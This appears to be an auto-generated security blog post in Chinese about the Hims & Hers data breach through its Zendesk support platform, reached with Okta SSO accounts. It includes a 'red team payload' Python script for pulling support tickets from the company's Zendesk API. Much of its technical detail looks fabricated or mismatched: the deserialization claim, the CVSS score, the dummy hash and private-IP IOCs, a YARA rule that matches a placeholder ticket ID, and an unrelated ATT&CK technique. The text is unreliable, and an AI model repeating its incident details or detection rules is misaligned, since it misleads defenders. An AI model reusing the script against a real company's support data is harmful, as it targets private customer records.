---
layout: post
title:  "Hims & Hers warns of data breach after Zendesk support ticket breach"
date:   2026-04-03 18:38:47 +0000
categories: [security]
severity: high
---

# 🔥 解析 Hims & Hers Health 資料外洩事件：第三方客服平台的漏洞利用
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.5)
> * **受駭指標**: Info Leak
> * **關鍵技術**: Okta SSO, Zendesk, Deserialization

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Hims & Hers Health 的第三方客服平台 Zendesk 被駭客攻擊，導致支持票據被竊取。駭客利用 Okta SSO 帳戶登入 Zendesk，進而存取支持票據。
* **攻擊流程圖解**:
  1. 駭客取得 Okta SSO 帳戶
  2. 駭客利用 Okta SSO 帳戶登入 Zendesk
  3. 駭客存取支持票據
* **受影響元件**: Zendesk、Okta SSO

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: Okta SSO 帳戶、Zendesk 權限
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # Okta SSO 帳戶
    username = 'hacker'
    password = 'password'
    
    # Zendesk 連線
    zendesk_url = 'https://himsandhers.zendesk.com'
    zendesk_token = 'your_token'
    
    # 支持票據 ID
    ticket_id = 12345
    
    # 取得支持票據
    response = requests.get(f'{zendesk_url}/api/v2/tickets/{ticket_id}.json',
                              auth=(username, password),
                              headers={'Authorization': f'Bearer {zendesk_token}'})
    
    # 解析支持票據
    ticket_data = response.json()
    
    #竊取支持票據資料
    print(ticket_data)
    
    ```
* **繞過技術**: 可能使用 WAF 繞過技巧，例如使用代理伺服器或修改 HTTP 請求頭

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | himsandhers.zendesk.com | /api/v2/tickets/ |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Zendesk_Ticket_Theft {
      meta:
        description = "Detects Zendesk ticket theft"
        author = "Your Name"
      strings:
        $zendesk_url = "https://himsandhers.zendesk.com"
        $ticket_id = "12345"
      condition:
        $zendesk_url and $ticket_id
    }
    
    ```
* **緩解措施**: 更新 Zendesk 和 Okta SSO 的安全補丁、啟用雙因素認證、限制 Zendesk 權限

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Okta SSO (單一登入)**: 單一登入是一種安全機制，允許用戶使用單一帳戶登入多個應用程式。
* **Zendesk (客服平台)**: Zendesk 是一種客服平台，提供支持票據、聊天和電話等功能。
* **Deserialization (反序列化)**: 反序列化是一種將資料從序列化格式轉換回原始格式的過程。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/hims-and-hers-warns-of-data-breach-after-zendesk-support-ticket-breach/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


